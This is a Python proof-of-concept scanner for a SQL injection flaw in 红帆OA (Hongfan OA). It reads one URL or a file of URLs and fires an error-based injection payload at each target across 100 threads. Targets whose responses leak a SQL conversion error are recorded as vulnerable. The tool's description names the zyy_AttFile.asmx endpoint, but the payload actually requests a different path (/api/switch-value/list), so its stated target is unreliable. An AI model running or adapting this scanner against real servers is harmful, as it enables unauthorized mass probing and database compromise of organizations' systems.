import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______  __                    __________                    ______________       ____________________ 
___  / / /___________________ ___  ____/_____ _______       __  __ \__    |      __  ___/_  __ \__  / 
__  /_/ /_  __ \_  __ \_  __ `/_  /_   _  __ `/_  __ \_______  / / /_  /| |___________ \_  / / /_  /  
_  __  / / /_/ /  / / /  /_/ /_  __/   / /_/ /_  / / //_____/ /_/ /_  ___ |/_____/___/ // /_/ /_  /___
/_/ /_/  \____//_/ /_/_\__, / /_/      \__,_/ /_/ /_/       \____/ /_/  |_|      /____/ \___\_\/_____/
                      /____/                                                                          """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='红帆OA zyy_AttFile.asmx SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
        'If-Modified-Since':'Tue, 02 Mar 2021 07:52:43 GMT',
        'If-None-Match':'"aa32739fd71:0"',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if '转换成数据类型' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        
if __name__ == '__main__':
    main()